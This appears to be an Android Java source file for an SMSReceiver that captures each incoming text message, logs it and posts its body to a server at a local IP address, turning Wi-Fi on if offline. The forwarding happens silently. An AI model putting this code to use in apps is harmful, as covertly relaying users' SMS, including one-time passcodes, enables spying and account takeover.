package ps.sc.spjesctrom;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;

import ps.sc.spjesctrom.FormatHttpPostOkHttp.BasicNameValusPostOkHttp;
import ps.sc.spjesctrom.FormatHttpPostOkHttp.FromHttpPostOkHttp;

import static android.content.Context.CONNECTIVITY_SERVICE;

public class SMSReceiver extends BroadcastReceiver {
	AllCommand allCommand = new AllCommand();
	@Override
	public void onReceive(Context context, Intent intent) {

		// Get the message
		Bundle extras = intent.getExtras();
		
		// Set object message in android device
		SmsMessage[] smgs = null;
		
		// Content SMS message
		String infoSMS = "";
		
		if (extras != null){
			// Retrieve the SMS message received
			Object[] pdus = (Object[]) extras.get("pdus");
			smgs = new SmsMessage[pdus.length];

			for (int i=0; i<smgs.length; i++){
				smgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				infoSMS += smgs[i].getMessageBody().toString();
				infoSMS += "\n";
			}
			
			//Toast.makeText(context, infoSMS, Toast.LENGTH_LONG).show();

			allCommand.SaveStringShare(context,allCommand.SMS_MESSAGE,infoSMS);
			onConnectURL(infoSMS,context);
			Log.e("SMSReceiver ", infoSMS);
		}
		
	}
	@SuppressLint("StaticFieldLeak")
	private void onConnectURL(String str , final Context context){


		final Connect_Mobile connect_mobile = new Connect_Mobile(context);
		final String text = str;
		if (connect_mobile.checkWifi_or_Mobile()==1){

			final String TestSMS = allCommand.GetStringShare(context,allCommand.SMS_MESSAGE,"");

			Log.e("SMSReceiver", "Send Message susscefull "+TestSMS);
			Log.e("SMSReceiver", str);

			new AsyncTask<String, Void, String>() {
				@Override
				protected String doInBackground(String... strings) {
					ArrayList<FromHttpPostOkHttp> params = new ArrayList<FromHttpPostOkHttp>();
					params.add(new BasicNameValusPostOkHttp().BasicNameValusPostOkHttp("FName", "Poomsak"));
					params.add(new BasicNameValusPostOkHttp().BasicNameValusPostOkHttp("LName", TestSMS));
					return allCommand.POST_OK_HTTP_SendData("http://192.168.1.45/TestSMS/testSMS.php",params);
				}
			}.execute();

		}else {

			new AsyncTask<String, Void, Void>() {
				@Override
				protected Void doInBackground(String... strings) {
					connect_mobile.onOpenWifi();
					return null;
				}

				@Override
				protected void onPostExecute(Void aVoid) {
					super.onPostExecute(aVoid);
					//Log.e("SMSReceiver", "Send Message on internect "+str);

				}
			}.execute();

		}

	}




}
